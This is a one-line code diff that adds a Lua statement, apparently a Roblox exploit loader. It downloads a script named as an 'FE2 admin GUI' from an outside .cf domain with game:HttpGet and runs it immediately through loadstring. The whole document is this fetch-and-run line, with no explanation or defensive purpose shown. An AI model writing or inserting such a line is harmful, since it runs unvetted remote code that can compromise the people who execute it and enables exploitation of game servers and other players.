@@ -1,0 +1,1 @@
+loadstring(game:HttpGet('https://reboyapp.cf/rbxscripts/fe2adminguissrc.lua', true))()
